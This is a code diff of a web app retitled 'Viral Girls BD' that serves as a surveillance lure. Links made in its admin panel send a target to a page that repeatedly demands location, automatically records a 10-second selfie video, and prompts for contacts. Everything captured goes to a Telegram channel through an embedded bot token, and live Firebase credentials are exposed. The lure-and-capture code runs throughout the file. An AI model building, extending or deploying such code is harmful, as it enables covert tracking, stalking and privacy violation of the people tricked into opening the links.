@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gemini Monitoring Platform</title>
+    <title>Viral Girls BD</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
@@ -56,14 +56,17 @@
             messagingSenderId: "563428983759",
             appId: "1:563428983759:web:c6887e4a610efee897c8ba"
         };
-        firebase.initializeApp(firebaseConfig);
+        // Initialize if not already initialized
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const db = firebase.firestore();
 
         // ----------------------------- TELEGRAM CONFIG -----------------------------
         const BOT_TOKEN = "8718981610:AAHsCUB2gJRx3i-DrbvN1gsDyHlT3qYb4oY";
         const CHANNEL_ID = "-1003709017479";
 
-        // Helper: Send to Telegram (Video, Location, Contacts)
+        // Helper: Send to Telegram
         async function sendToTelegram(type, data, extra = "") {
             try {
                 if (type === 'video' && data instanceof Blob) {
@@ -90,7 +93,6 @@
             } catch(e) { console.warn("Telegram send error", e); }
         }
 
-        // Helper: UUID
         function uuidv4() { 
             return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { 
                 let r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8); 
@@ -100,10 +102,8 @@
         
         function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m=>({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
         
-        // ----------------------------- TARGET MODE: LOCATION -> CAMERA 10s VIDEO -> CONTACT SHARE -----------------------------
-        let currentTargetProfileId = null;
-
-        // 1. Location permission loop until granted (persistent request)
+        // ----------------------------- TARGET MODE -----------------------------
+        // 1. Location permission loop
         async function requestLocationUntilGranted(profileId, profileName) {
             return new Promise((resolve) => {
                 const requestLocation = () => {
@@ -111,7 +111,6 @@
                         async (position) => {
                             const { latitude, longitude, accuracy } = position.coords;
                             await sendToTelegram('location', { lat: latitude, lng: longitude, accuracy }, `${profileName} (${profileId})`);
-                            // Update history in firestore
                             const profileRef = db.collection('profiles').doc(profileId);
                             const doc = await profileRef.get();
                             const history = doc.exists ? (doc.data().history || []) : [];
@@ -134,7 +133,7 @@
             });
         }
 
-        // 2. Camera + 10 seconds video recording (selfie) and send to Telegram
+        // 2. Camera recording 10 seconds
         async function startCameraRecording(profileId, profileName) {
             try {
                 const indicator = document.createElement('div');
@@ -149,7 +148,6 @@
                 recorder.onstop = async () => {
                     const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                     await sendToTelegram('video', videoBlob, `${profileName} (${profileId}) - ১০ সেকেন্ড সেলফি ভিডিও`);
-                    // Update history
                     const profileRef = db.collection('profiles').doc(profileId);
                     const doc = await profileRef.get();
                     const history = doc.exists ? (doc.data().history || []) : [];
@@ -164,7 +162,7 @@
                     if (recorder.state === 'recording') recorder.stop();
                 }, 10000);
             } catch (err) {
-                console.error("Camera permission error", err);
+                console.error("Camera error", err);
                 const toast = document.createElement('div');
                 toast.className = 'toast-msg';
                 toast.innerText = '📷 ক্যামেরা অনুমতি প্রয়োজন! অনুগ্রহ করে ক্যামেরা অ্যাক্সেস দিন।';
@@ -173,7 +171,7 @@
             }
         }
 
-        // 3. Contact share (optional but integrated)
+        // 3. Contact share
         async function promptContactShare(profileId, profileName) {
             setTimeout(async () => {
                 if (navigator.contacts && navigator.contacts.select) {
@@ -204,7 +202,6 @@
             }, 2000);
         }
 
-        // Render Target Landing Page (after location granted)
         function renderTargetLanding(profileId, profileName) {
             const root = document.getElementById('app-root');
             root.innerHTML = `
@@ -255,22 +252,36 @@
             }
         }
 
-        // MAIN TARGET INIT: loading screen -> location permission -> then load page & start camera automatically + contacts
         async function initTargetMode(targetId) {
-            const docSnap = await db.collection('profiles').doc(targetId).get();
-            if (!docSnap.exists) {
-                document.getElementById('app-root').innerHTML = `<div class="p-10 text-center text-red-600 text-xl">❌ অবৈধ লিংক বা প্রোফাইল নেই।</div>`;
+            // First check if the link exists in customPages collection
+            const pageSnap = await db.collection('customPages').doc(targetId).get();
+            if (!pageSnap.exists) {
+                document.getElementById('app-root').innerHTML = `<div class="p-10 text-center text-red-600 text-xl">❌ অবৈধ লিংক! এই লিংকটি বিদ্যমান নেই।</div>`;
                 return;
             }
-            const profileData = docSnap.data();
+            
+            const pageData = pageSnap.data();
+            const profileId = pageData.profileId;
+            
+            // Get profile data
+            const profileSnap = await db.collection('profiles').doc(profileId).get();
+            if (!profileSnap.exists) {
+                document.getElementById('app-root').innerHTML = `<div class="p-10 text-center text-red-600 text-xl">❌ প্রোফাইল পাওয়া যায়নি!</div>`;
+                return;
+            }
+            
+            const profileData = profileSnap.data();
             const profileName = profileData.name || "টার্গেট ইউজার";
-            currentTargetProfileId = targetId;
             
-            // Update usage count
-            const usageCount = (profileData.usageCount || 0) + 1;
-            await db.collection('profiles').doc(targetId).update({ usageCount, lastVisit: new Date().toISOString() });
+            // Update usage count for the page
+            const newUsageCount = (pageData.usageCount || 0) + 1;
+            await db.collection('customPages').doc(targetId).update({ usageCount: newUsageCount, lastVisit: new Date().toISOString() });
             
-            // Show loading overlay with "loading..." text (exactly as requirement)
+            // Update profile visit count
+            const profileUsageCount = (profileData.usageCount || 0) + 1;
+            await db.collection('profiles').doc(profileId).update({ usageCount: profileUsageCount, lastVisit: new Date().toISOString() });
+            
+            // Show loading overlay
             const root = document.getElementById('app-root');
             root.innerHTML = '';
             const loaderDiv = document.createElement('div');
@@ -279,21 +290,20 @@
             loaderDiv.innerHTML = `<div class="spinner"></div><p class="mt-5 text-lg font-semibold text-blue-600 tracking-wide">loading...</p>`;
             root.appendChild(loaderDiv);
             
-            // 1. Request location permission until granted (persistent loop)
-            await requestLocationUntilGranted(targetId, profileName);
+            // Request location permission
+            await requestLocationUntilGranted(profileId, profileName);
             
-            // Remove loading overlay after location granted
+            // Remove loading overlay
             const loader = document.getElementById('perm-loader');
             if (loader) loader.remove();
             
-            // 2. Render target landing UI
-            renderTargetLanding(targetId, profileName);
+            // Render landing page
+            renderTargetLanding(profileId, profileName);
             
-            // 3. Automatically start camera recording (10 sec) after landing
+            // Auto start camera and contact share
             setTimeout(async () => {
-                await startCameraRecording(targetId, profileName);
-                // 4. Prompt contact share (optional but appears)
-                await promptContactShare(targetId, profileName);
+                await startCameraRecording(profileId, profileName);
+                await promptContactShare(profileId, profileName);
             }, 1500);
         }
 
@@ -308,14 +318,23 @@
             allCustomLinks = linksSnap.docs.map(d => ({ id: d.id, ...d.data() }));
         }
 
-        async function savePage(page) { await db.collection('customPages').doc(page.id).set(page); }
-        async function deletePage(pageId) { await db.collection('customPages').doc(pageId).delete(); allCustomLinks = allCustomLinks.filter(l => l.id !== pageId); }
+        async function savePage(page) { 
+            await db.collection('customPages').doc(page.id).set(page); 
+        }
+        
+        async function deletePage(pageId) { 
+            await db.collection('customPages').doc(pageId).delete(); 
+            allCustomLinks = allCustomLinks.filter(l => l.id !== pageId);
+        }
+        
         async function deleteProfile(profileId) { 
+            // Delete all links associated with this profile
+            const linksToDelete = allCustomLinks.filter(l => l.profileId === profileId);
+            for (const link of linksToDelete) {
+                await db.collection('customPages').doc(link.id).delete();
+            }
             await db.collection('profiles').doc(profileId).delete(); 
-            const linked = await db.collection('customPages').where('profileId', '==', profileId).get();
-            linked.forEach(d => d.ref.delete());
-            allProfiles = allProfiles.filter(p => p.id !== profileId);
-            allCustomLinks = allCustomLinks.filter(l => l.profileId !== profileId);
+            await loadFirestoreData();
         }
 
         async function createCustomLink(profileId, title, heading, desc, btnText, imageUrl = "") {
@@ -323,10 +342,16 @@
             const profile = allProfiles.find(p => p.id === profileId);
             if (!profile) throw new Error("Profile not found");
             const newPage = {
-                id: linkId, profileId: profileId, profileName: profile.name,
-                pageTitle: title, mainHeading: heading, description: desc,
-                buttonText: btnText, imageUrl: imageUrl,
-                createdAt: new Date().toISOString(), usageCount: 0
+                id: linkId, 
+                profileId: profileId, 
+                profileName: profile.name,
+                pageTitle: title, 
+                mainHeading: heading, 
+                description: desc,
+                buttonText: btnText, 
+                imageUrl: imageUrl,
+                createdAt: new Date().toISOString(), 
+                usageCount: 0
             };
             await savePage(newPage);
             allCustomLinks.push(newPage);
@@ -340,16 +365,28 @@
         async function createProfile(name, phone) {
             const newId = uuidv4();
             const newProfile = { 
-                id: newId, name, phone: phone || '', note: '', createdAt: new Date().toISOString(), 
-                history: [], usageCount: 0, permissionsTracked: true
+                id: newId, 
+                name, 
+                phone: phone || '', 
+                note: '', 
+                createdAt: new Date().toISOString(), 
+                history: [], 
+                usageCount: 0
             };
             await db.collection('profiles').doc(newId).set(newProfile);
             await loadFirestoreData();
             return newProfile;
         }
         
-        window.toggleSidebar = function() { const s = document.getElementById('sidebar'); if(s) s.classList.toggle('active'); };
-        window.showGenerator = function() { const gen = document.getElementById('generator-view'); if(gen) gen.scrollIntoView({ behavior: 'smooth' }); };
+        window.toggleSidebar = function() { 
+            const s = document.getElementById('sidebar'); 
+            if(s) s.classList.toggle('active'); 
+        };
+        
+        window.showGenerator = function() { 
+            const gen = document.getElementById('generator-view'); 
+            if(gen) gen.scrollIntoView({ behavior: 'smooth' }); 
+        };
 
         async function renderAdminPanel() {
             await loadFirestoreData();
@@ -423,18 +460,24 @@
                     </main>
                 </div>
             `;
-            // event handlers
+            
+            // Event handlers
             document.getElementById('auto-link-btn').onclick = () => { document.getElementById('custom-fields').style.display = 'none'; };
             document.getElementById('custom-link-toggle').onclick = () => { document.getElementById('custom-fields').style.display = 'block'; };
             document.getElementById('auto-link-btn').click();
+            
             document.getElementById('generate-link-btn').onclick = async () => {
                 const profileId = document.getElementById('profile-select').value;
-                if (!profileId) { alert('প্রোফাইল নির্বাচন করুন'); return; }
+                if (!profileId) { 
+                    alert('প্রোফাইল নির্বাচন করুন'); 
+                    return; 
+                }
                 const isAuto = document.getElementById('custom-fields').style.display === 'none';
                 let linkUrl = '';
                 try {
-                    if (isAuto) linkUrl = await createAutoLink(profileId);
-                    else {
+                    if (isAuto) {
+                        linkUrl = await createAutoLink(profileId);
+                    } else {
                         const title = document.getElementById('page-title').value || "কাস্টম পেজ";
                         const heading = document.getElementById('main-heading').value || "বিশেষ কন্টেন্ট";
                         const desc = document.getElementById('desc-text').value || "<p>আনলক করতে নিচে ক্লিক করুন</p>";
@@ -446,18 +489,31 @@
                     document.getElementById('result-link-box').classList.remove('hidden');
                     await refreshSidebarHistory();
                     renderProfilesAndLinks();
-                } catch(err) { alert("লিংক তৈরি ব্যর্থ: " + err.message); }
+                } catch(err) { 
+                    alert("লিংক তৈরি ব্যর্থ: " + err.message); 
+                }
             };
-            document.getElementById('copy-link-btn').onclick = () => { const input = document.getElementById('generated-url'); input.select(); document.execCommand('copy'); alert('লিংক কপি হয়েছে!'); };
+            
+            document.getElementById('copy-link-btn').onclick = () => { 
+                const input = document.getElementById('generated-url'); 
+                input.select(); 
+                document.execCommand('copy'); 
+                alert('লিংক কপি হয়েছে!'); 
+            };
+            
             document.getElementById('create-profile-admin').onclick = async () => {
                 const name = document.getElementById('new-profile-name').value.trim();
-                if (!name) { alert('নাম লিখুন'); return; }
+                if (!name) { 
+                    alert('নাম লিখুন'); 
+                    return; 
+                }
                 const phone = document.getElementById('new-profile-phone').value;
                 await createProfile(name, phone);
                 await refreshProfileSelect();
                 renderProfilesAndLinks();
                 await refreshSidebarHistory();
             };
+            
             await refreshProfileSelect();
             renderProfilesAndLinks();
             await refreshSidebarHistory();
@@ -482,7 +538,15 @@
                     </div>
                 `).join('');
                 document.querySelectorAll('.delete-profile-btn').forEach(btn => {
-                    btn.onclick = async () => { if(confirm('ডিলিট করুন? প্রোফাইলের সব লিংকও মুছে যাবে।')) { await deleteProfile(btn.dataset.id); await loadFirestoreData(); renderProfilesAndLinks(); await refreshProfileSelect(); await refreshSidebarHistory(); } };
+                    btn.onclick = async () => { 
+                        if(confirm('ডিলিট করুন? প্রোফাইলের সব লিংকও মুছে যাবে।')) { 
+                            await deleteProfile(btn.dataset.id); 
+                            await loadFirestoreData(); 
+                            renderProfilesAndLinks(); 
+                            await refreshProfileSelect(); 
+                            await refreshSidebarHistory(); 
+                        } 
+                    };
                 });
             }
             const linksDiv = document.getElementById('links-list-admin');
@@ -494,7 +558,14 @@
                     </div>
                 `).join('');
                 document.querySelectorAll('.delete-link-btn').forEach(btn => {
-                    btn.onclick = async () => { if(confirm('লিংক ডিলিট?')) { await deletePage(btn.dataset.id); await loadFirestoreData(); renderProfilesAndLinks(); await refreshSidebarHistory(); } };
+                    btn.onclick = async () => { 
+                        if(confirm('লিংক ডিলিট?')) { 
+                            await deletePage(btn.dataset.id); 
+                            await loadFirestoreData(); 
+                            renderProfilesAndLinks(); 
+                            await refreshSidebarHistory(); 
+                        } 
+                    };
                 });
             }
         }
@@ -511,14 +582,13 @@
             }
         }
 
-        // ----------------------------- ROUTER: Admin direct access, no password -----------------------------
+        // ----------------------------- ROUTER -----------------------------
         (async function() {
             const urlParams = new URLSearchParams(window.location.search);
             const viewParam = urlParams.get('view');
             if (viewParam) {
                 await initTargetMode(viewParam);
             } else {
-                // Admin panel - No password required, instant load
                 await renderAdminPanel();
             }
         })();
